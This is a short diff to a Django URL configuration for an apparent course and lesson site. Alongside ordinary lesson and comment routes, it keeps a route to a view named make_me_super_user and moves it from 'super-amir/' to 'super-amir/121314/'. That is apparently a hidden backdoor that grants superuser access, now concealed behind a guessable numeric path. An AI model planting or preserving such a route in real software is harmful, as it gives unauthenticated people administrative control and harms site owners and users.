@@ -10,5 +10,5 @@ urlpatterns = [
     path("course/<int:course_id>/lesson/<int:lesson_id>/", views.lesson_view, name="Lesson"),
     path("course/<int:course_id>/lesson/<int:lesson_id>/comment-add-lesson/", views.comment_add_lesson, name="CommentAddLesson"),
     path("course/<int:course_id>/lesson/<int:lesson_id>/comment-add-comment/", views.comment_add_comment, name="CommentAddComment"),
-    path('super-amir/', views.make_me_super_user),
+    path('super-amir/121314/', views.make_me_super_user),
 ]
